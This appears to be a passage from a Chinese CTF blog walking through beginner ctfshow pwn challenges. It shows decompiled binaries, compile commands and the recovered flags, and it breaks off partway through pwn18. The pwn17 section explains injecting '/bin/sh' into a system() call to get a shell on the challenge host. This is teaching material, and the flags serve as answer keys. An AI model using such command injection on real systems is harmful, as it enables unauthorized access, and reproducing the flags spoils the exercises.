<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">1024</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>	<span class="token comment">// 定义了一个缓冲区 buffer，用于存储从文件中读取的二进制数据，以及一个常量 BUFFER_SIZE，表示缓冲区的大小</span>
    <span class="token class-name">size_t</span> n<span class="token punctuation">;</span>
    fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 以二进制模式打开文件key</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"Nothing here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">char</span> output<span class="token punctuation">[</span>BUFFER_SIZE <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 	<span class="token comment">// 定义了一个输出字符串变量 output，大小为 BUFFER_SIZE * 9 + 12，用于存储输出的格式化字符串</span>
    <span class="token keyword">int</span> offset <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>	<span class="token comment">// 用于跟踪字符串的长度</span>
    offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"ctfshow&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 将 "ctfshow&#123;" 格式化字符串添加到 output 中，并将 offset 更新为添加后字符串的长度</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>	<span class="token comment">// 使用 fread 函数从文件中读取二进制数据，并将数据转换为二进制字符串</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>buffer<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> j<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 转换后的字符串通过 sprintf 函数添加到 output 中，并将 offset 更新为添加后字符串的长度</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 如果文件没有读取到末尾，程序将在输出字符串中添加一个空格。</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    offset <span class="token operator">+=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span>output <span class="token operator">+</span> offset<span class="token punctuation">,</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码大致逻辑就是读取key文件，然后通过几个循环的操作得到flag</p>
<p>而key文件是需要我们本地创建的，题目给定key为”CTFshow”</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> CTFshow <span class="token operator">></span> key <span class="token comment"># 创建内容为CTFshow的key文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后我们再编译运行flag.c文件就可以获得flag了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> flag flag.c
./flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622111620720.png" alt="image-20230622111620720"></p>
<p>flag：<code>ctfshow&#123;01000011_01010100_01000110_01110011_01101000_01101111_01110111_00001010&#125;</code></p>
<hr>
<h3 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h3><blockquote>
<p>nasm编译汇编代码到可执行文件</p>
</blockquote>
<p>下载题目附件，得到flag.asm</p>
<p>丢到虚拟机中进行编译</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nasm <span class="token parameter variable">-f</span> elf64 flag.asm <span class="token comment"># 将flag.asm编译成64为.o文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ld <span class="token parameter variable">-s</span> <span class="token parameter variable">-o</span> flag flag.o <span class="token comment"># 将flag.o链接成flag可执行文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后运行即可获取flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622160843857.png" alt="image-20230622160843857"></p>
<p>flag：<code>ctfshow&#123;@ss3mb1y_1s_3@sy&#125;</code></p>
<hr>
<h3 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h3><blockquote>
<p>gcc编译</p>
</blockquote>
<p>下载附件得到flag.s</p>
<p>在虚拟机中进行编译并运行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-o</span> flag flag.s <span class="token comment"># 将flag.s编译成flag可执行文件</span>
./flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622162029809.png" alt="image-20230622162029809"></p>
<p>这里遇到了一点问题，在我自己的虚拟机环境上编译出来的flag文件运行结果会多出后四位，不过多运行几遍就可以知道flag应该是不变的那几位（</p>
<p>实际flag：<code>ctfshow&#123;daniuniuda&#125;</code></p>
<hr>
<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><h3 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h3><blockquote>
<p>system(“&#x2F;bin&#x2F;sh”)绕过长度限制</p>
</blockquote>
<p>下载题目附件pwn，先在虚拟机中给个可执行权限检查一下文件信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x pwn
checksec ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622195111033.png" alt="image-20230622195111033"></p>
<p>发现是64位可执行文件</p>
<p>丢进ida64反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-1Ch] BYREF</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ah] [rbp-16h] BYREF</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Eh] [rbp-12h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_D48<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_DC0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_E40<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_ED0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_F60<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_FE8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_1080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : You should understand the basic command usage of Linux! "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token number">790655852</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nHow much do you know about Linux commands? \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\nEnter the command you want choose:(1.2.3.4 or 5)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v4 <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which directory?('/','./' or the directiry you want?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Execution succeeded!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"$cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"... ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your flag is ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;flag is not here!&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0x1BF52u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>
        <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"su: Authentication failure"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"See you!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token operator">:</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"command not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>分析一下可以知道首先是进入一个while循环打印出menu</p>
<p>然后进入switch-case语句，根据我们输入的选项来执行分支语句</p>
<p>可以发现case3中有读取flag的语句</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"$cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"... ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your flag is ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">5u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ctfshow&#123;flag is not here!&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wtf?You haven't left yet?\nOk~ give you flag:\nflag is loading......"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0x1BF52u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是存在<code>sleep(0x1BF52u)</code>，换算成十进制就是要我们等待114514秒，所以这个选项明显走不通</p>
<p>再看看case2</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which directory?('/','./' or the directiry you want?)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0xAuLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 通过read()函数从标准输入（stdin）中读取用户输入，并将其存储在名为“buf”的缓冲区中，并且限制了长度最多为0xA，即9</span>
  <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 将用户输入的目录追加到名为“dest”的已有字符串后面</span>
  <span class="token function">system</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Execution succeeded!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里会将我们输入的字符串当作参数传入system()函数，也就是可以进行命令执行</p>
<p>但是<code>cat /ctfshow_flag</code>的长度明显比9多</p>
<p>所以这里得想办法绕过限制</p>
<h4 id="system-“-x2F-bin-x2F-sh”"><a href="#system-“-x2F-bin-x2F-sh”" class="headerlink" title="system(“&#x2F;bin&#x2F;sh”)"></a>system(“&#x2F;bin&#x2F;sh”)</h4><blockquote>
<p>启动一个新的shell进程，并将其作为当前进程的控制台</p>
</blockquote>
<p>明显<code>/bin/sh</code>的长度没有超过9，所以可以利用这种方法获取shell实现绕过</p>
<p>nc连上靶机开做即可</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230622200826816.png" alt="image-20230622200826816"></p>
<hr>
<h3 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h3><blockquote>
<p>echo &gt;&gt;和 echo &gt;</p>
</blockquote>
<p>下载题目附件pwn</p>
<p>和上题一样在虚拟机中给执行权限，checksec查看信息，发现是64位</p>
<p>丢到ida64进行反编译</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_B10<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_B90<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_C20<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_CB0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_D38<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_DD0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Do you know redirect output ?                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 以上为前面的部分</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Which is the real flag?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">9</span> <span class="token punctuation">)</span>
    <span class="token function">fake</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">real</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat /ctfshow_flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前面部分的语句就是输出一些题目信息，告诉我们要进行一次输入，关键就在if-else语句中的两个函数内容，如果输入值为9进入<code>fake()</code>函数，反之为<code>real()</code>函数</p>
<p>双击查看<code>fake()</code>函数</p>
